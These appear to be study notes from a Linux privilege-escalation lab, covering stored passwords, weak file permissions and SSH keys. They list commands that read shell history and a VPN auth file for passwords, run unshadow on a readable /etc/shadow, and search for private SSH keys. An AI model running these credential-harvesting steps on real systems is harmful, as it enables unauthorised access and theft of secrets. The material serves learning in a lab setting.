# Introduction
**Escalation Path** – Passwords & File Permissions: A privilege escalation technique in which an attacker exploits weak, reused, stored, or misconfigured passwords and improperly configured file permissions to gain access to sensitive data, execute privileged operations, or obtain higher-level privileges on a system.

# Escalation via stored passwords
**Escalation via Stored Passwords**: A privilege escalation technique in which an attacker discovers exposed credentials stored in files, scripts, configuration files, environment variables, or credential stores and uses them to access another account or a higher-privileged service.

Following Commands:
```bash
history
cat .bash_history
cat .zsh_history
# If user ever had ran a cmd with password in it.
# So, here in history we do happen to find a command like "mysql -h somehost.local -uroot -ppassword123"
# So, we could try to su with root and password123 as password
# And, We do actually achieve the root shell
######

# Now in our home path there was a file myvpn.ovpn. After investigating we find there is a path "/etc/openvpn/auth.txt", So...
cat /etc/openvpn/auth.txt
# We happen to file username and password
# (here, those creds were of previous version of machine) 

```

# Escalation via Weak File Permissions
**Escalation via Weak File Permissions**: A privilege escalation technique in which an attacker exploits improperly configured file or directory permissions to read sensitive data, modify executable files or scripts, or manipulate privileged processes to gain higher-level privileges.

Following Commands:
```bash
TCM@debian:~$ ls -l /etc/passwd
-rw-r--r-- 1 root root 950 Jun 17  2020 /etc/passwd
TCM@debian:~$ ls -l /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
# Now here we are not supposed have a read  permission for /etc/shadow file

unshadow /etc/passwd /etc/shadow
# Usage: unshadow PASSWORD-FILE SHADOW-FILE

```

# Escalation via SSH Keys
**Escalation via SSH Keys**: A privilege escalation technique in which an attacker discovers exposed, improperly protected, or unauthorized SSH private keys and uses them to authenticate as another user or a privileged account, potentially gaining elevated access to a system.

Following Commands:
```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
# finds ssh keys


```





